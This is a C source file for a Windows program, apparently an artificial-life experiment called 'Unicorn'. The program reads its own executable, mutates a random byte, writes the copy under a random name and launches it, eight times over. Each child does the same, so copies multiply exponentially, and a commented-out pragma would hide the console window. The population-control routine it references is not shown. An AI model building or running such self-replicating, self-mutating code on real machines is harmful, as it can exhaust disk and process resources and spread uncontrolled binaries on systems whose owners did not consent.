#define _CRT_SECURE_NO_WARNINGS
//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include <stdio.h>
#include <Windows.h>
#include <sys\timeb.h>
#include "Unicorn.h"

#define NextNum 8
#define GapTime 4096

int myEXESize = 0;
UINT8* myFileBuffer = 0;

char currentDIR[256] = { 0 };
char nextEXEName[256] = { 0 };
char nextEXE_NTPath[256] = { 0 };

void PopCtl();
void create_process(char *ascii_path, char *cwd);

void create_proc_worker()
{
    strcpy(nextEXE_NTPath, currentDIR);
    strcat(nextEXE_NTPath, nextEXEName);
    create_process(nextEXE_NTPath, currentDIR+4);
}

int main(int argc, char** argv)
{
    //printf("---Unicorn Debug---\nargc = %d\nargv[0] = %s\n----\n", argc, argv[0]);
    UINT8 n = sprintf(currentDIR, "\\??\\%s", argv[0]);
    for (int i = n - 1; i >= 0; i--)
    {
        if (currentDIR[i] == '\\')
        {
            currentDIR[i + 1] = 0;
            break;
        }
    }
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
    FILE* fp = fopen(argv[0], "rb");
    fseek(fp, 0, SEEK_END);
    myEXESize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    fread(myFileBuffer, 1, myEXESize, fp);
    fclose(fp); fp = NULL;

    for (int i = 0; i < NextNum; i++)
    {
        myFileBuffer[Get_Hardware_Rand() % myEXESize] = Get_Hardware_Rand() & 0xFF;
        
        while (fp == NULL)
        {
            sprintf(nextEXEName, "Unicorn-%X.exe", Get_Hardware_Rand() & 0xFFFF);
            fp = fopen(nextEXEName, "wb");
        }
        fwrite(myFileBuffer, 1, myEXESize, fp);
        Sleep(GapTime); // Delay is important here to avoid producing so fast
        fclose(fp); fp = NULL; // unlock the file

        create_proc_worker();
    }
}